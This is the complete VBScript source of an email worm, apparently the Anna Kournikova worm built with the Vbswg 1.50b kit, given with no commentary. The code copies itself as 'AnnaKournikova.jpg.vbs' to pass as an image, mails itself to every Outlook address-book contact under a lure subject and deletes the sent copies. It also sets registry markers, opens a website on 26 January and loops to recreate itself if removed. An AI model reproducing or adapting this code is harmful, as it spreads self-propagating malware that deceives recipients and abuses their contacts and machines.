'Vbs.OnTheFly Created By OnTheFly
On Error Resume Next
Set shellobject = CreateObject("WScript.Shell")
shellobject.regwrite "HKCU\software\OnTheFly\", "Worm made with Vbswg 1.50b"
Set filesystem= Createobject("scripting.filesystemobject")
filesystem.copyfile wscript.scriptfullname,filesystem.GetSpecialFolder(0)&
"\AnnaKournikova.jpg.vbs"
if shellobject.regread ("HKCU\software\OnTheFly\mailed") <> "1" then
mail_trojan()
end if
if month(now) =1 and day(now) =26 then
shellobject.run "Http://www.dynabyte.nl",3,false
end if
Set wormfile= filesystem.opentextfile(wscript.scriptfullname, 1)
payload= wormfile.readall
wormfile.Close
Do
If Not (filesystem.fileexists(wscript.scriptfullname)) Then
Set newfile= filesystem.createtextfile(wscript.scriptfullname, True)
newfile.writepayload
newfile.Close
End If
Loop
Function mail_trojan()
On Error Resume Next
Set outlook = CreateObject("Outlook.Application")
If outlook= "Outlook"Then
Set mapi=outlook.GetNameSpace("MAPI")
Set addresses= mapi.AddressLists
For Each address In addresses
If address.AddressEntries.Count <> 0 Then
count = address.AddressEntries.Count
For I= 1 To count
Set email = outlook.CreateItem(0)
Set entry = address.AddressEntries(I)
email.To = entry.Address
email.Subject = "Here you have, ;o)"
email.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set attachment=email.Attachments
attachment.Add filesystem.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"
email.DeleteAfterSubmit = True
If email.To <> "" Then
email.Send
shellobject.regwrite "HKCU\software\OnTheFly\mailed", "1"
End If
Next
End If
Next
end if
End Function
'Vbswg 1.50b